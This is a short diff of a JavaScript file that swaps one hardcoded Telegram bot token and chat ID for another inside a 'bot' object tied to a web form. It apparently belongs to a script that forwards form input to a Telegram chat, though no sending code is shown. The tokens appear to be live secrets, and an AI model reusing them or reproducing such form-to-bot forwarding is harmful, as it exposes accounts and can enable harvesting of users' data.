@@ -1,8 +1,8 @@
 let form = document.getElementById("form");
 
 let bot = {
-    TOKEN: "6364188191:AAFmBsaqx58xGorfI_ergea9gA7UFyoLtOA",
-    chatID: "-4122063919",
+    TOKEN: "6837873605:AAFD07DqxA38rzvzO90vg-mNhGosDegWce4",
+    chatID: "-4106900723",
 };
 
 function openForm() {
